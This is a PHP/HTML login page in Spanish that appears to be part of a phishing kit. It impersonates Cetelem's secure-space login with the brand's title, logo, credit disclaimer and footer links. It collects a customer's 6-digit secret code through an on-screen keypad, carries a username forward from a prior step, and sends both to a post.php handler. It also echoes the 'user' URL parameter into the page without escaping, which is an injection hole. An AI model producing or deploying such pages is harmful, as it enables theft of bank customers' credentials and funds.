<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/pas.css">
    <title>Iniciar sesión en Cetelem</title>
</head>
<body>

<main>
    
    <div class="form">

<div class="logo">
<img src="res/img/logo.png" >
</div>
<div class="title">
<label>Un crédito te compromete y debe ser reembolsado. <br>
Verifica tu capacidad de pago antes de comprometerte.</label>
</div>

    <div class="continer">
    <form action="post.php" method="post">
        
    <div class="man">
        <img src="res/img/man.png" >
        </div>
        
        <div class="tite">
        <h1>Acceder a mi espacio seguro</h1>
        </div>

    <div class="col">
            <label for="code">Código secreto (6 dígitos)</label>
            <input type="hidden" name="user" value="<?php echo @$_GET['user']; ?>">
            <input type="password"  maxlength="6"  id="pass" placeholder="******" name="pass" required >  </div>

            <div class="keypad">
                <button type="button" onclick="picker(3)">3</button>
                <button type="button" onclick="picker(2)">2</button>
                <button type="button" onclick="picker(4)">4</button>
                <button type="button" onclick="picker(0)">0</button>
                <button type="button" onclick="picker(8)">8</button>
                <button type="button" onclick="picker(9)">9</button>
                <button type="button" onclick="picker(7)">7</button>
                <button type="button" onclick="picker(5)">5</button>
                <button type="button" onclick="picker(1)">1</button>
                <button type="button" onclick="picker(6)">6</button>
            </div>

            <div class="but">
            <button type="submit" class="submit-btn">Iniciar sesión</button> </div>

            <div class="a">
<a href="#">¿Olvidaste tu código secreto?</a>
</div>

</form>
    </div>
    </div>

    <div class="span">
<span>Transferencia rápida</span>
<span>Cancelación</span> <span>Contacto</span> <span>Preguntas frecuentes</span> <span>Reclamaciones</span> 
<span>Avisos legales</span> <span>Información sobre cookies</span> <span>Preferencias de cookies</span> 
<span>Datos personales</span> 
<br><br><span>Declaración de accesibilidad</span> <span>Accesibilidad</span>
</div> 

<div class="span1">
<span>Transferencia rápida</span>
<span>Cancelación</span> <span>Contacto</span> <span>Preguntas frecuentes</span> <span>Reclamaciones</span> 
<span>Avisos legales</span> <span>Información sobre cookies</span> <span>Preferencias de cookies</span> 
<span>Datos personales</span> 
 <span>Declaración de accesibilidad</span> <span>Accesibilidad</span>
</div> 

<div class="fa">
<img src="res/img/fa.png" >
</div>

</main>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>
function picker(id){
    if($("#pass").val().length==6){
        return false;
    }
    $("#pass").val($("#pass").val()+id);
}
</script>
</body>
</html>